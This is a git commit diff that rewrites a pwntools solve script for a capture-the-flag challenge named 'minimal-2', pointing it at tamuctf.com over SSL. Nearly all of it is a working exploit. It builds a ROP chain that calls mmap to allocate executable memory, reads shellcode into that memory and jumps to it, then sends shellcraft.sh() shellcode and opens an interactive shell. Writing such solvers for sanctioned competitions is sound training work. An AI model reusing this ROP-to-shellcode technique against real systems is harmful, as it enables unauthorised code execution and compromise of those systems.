a399ece69c2c1fc9718c2b4daf2bf725f24ea48e
Teddy Heinen <teddy@heinen.dev>
2021-09-24 16:52:39 -0500

    add solver, template

--- pwn/minimal_2/solve.py
+++ pwn/minimal_2/solve.py
@@ -7,57 +7,47 @@ rop = ROP(exe)
 
 context.binary = exe
 context.terminal = "kitty"
-def conn():
-    if args.REMOTE:
-        return remote("localhost", 7006)
-    elif args.GDB:
-        return gdb.debug([exe.path])
-    else:
-        return process([exe.path])
+
+CHAL = "minimal-2"
+
+p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)
 
 
-def main():
-    r = conn()
-    mmap = list(map(p64, [
-        rop.rax[0],
-        0x9,
-        rop.rdi[0],
-        0x10000,
-        rop.rsi[0],
-        0x1000,
-        rop.rdx[0],
-        0x7,
-        rop.r10[0],
-        0x22,
-        rop.syscall[0]
-    ]))
+mmap = list(map(p64, [
+    rop.rax[0],
+    0x9,
+    rop.rdi[0],
+    0x10000,
+    rop.rsi[0],
+    0x1000,
+    rop.rdx[0],
+    0x7,
+    rop.r10[0],
+    0x22,
+    rop.syscall[0]
+]))
 
-    read = list(map(p64, [
-        rop.rax[0],
-        0,
-        rop.rdi[0],
-        0,
-        rop.rsi[0],
-        0x10000,
-        rop.rdx[0],
-        0x1000,
-        rop.syscall[0]
-    ]))
+read = list(map(p64, [
+    rop.rax[0],
+    0,
+    rop.rdi[0],
+    0,
+    rop.rsi[0],
+    0x10000,
+    rop.rdx[0],
+    0x1000,
+    rop.syscall[0]
+]))
 
-    payload = flat({
-        8: [
-            mmap,
-            read,
-            p64(0x10000)
-        ] 
-    })
-    r.sendline(payload)
-    r.sendline(asm(shellcraft.sh()))
-    # good luck pwning :)
+payload = flat({
+    8: [
+        mmap,
+        read,
+        p64(0x10000)
+    ] 
+})
+p.sendline(payload)
+p.sendline(asm(shellcraft.sh()))
+# automate inputs as necessary here
 
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
-
+p.interactive()
